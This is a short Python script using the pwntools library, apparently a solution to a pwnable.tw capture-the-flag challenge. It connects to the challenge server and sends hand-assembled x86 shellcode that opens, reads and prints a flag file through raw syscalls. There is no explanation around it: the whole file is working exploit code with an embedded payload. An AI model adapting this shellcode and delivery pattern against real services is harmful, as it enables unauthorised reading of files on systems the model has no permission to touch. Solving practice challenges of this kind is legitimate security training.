#! /usr/bin/env python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
shellcode = b"j\x05Xhag\x00\x00hw/flhe/orh/hom1\xc9\x99T[\xcd\x80j\x03Xj\x03[h\x00\xa5\x04\x08Yj2Z\xcd\x80j\x04Xj\x01[h\x00\xa5\x04\x08Yj2Z\xcd\x80"
p = remote("chall.pwnable.tw", 10001)
p.recv()
p.sendline(shellcode)
p.interactive()
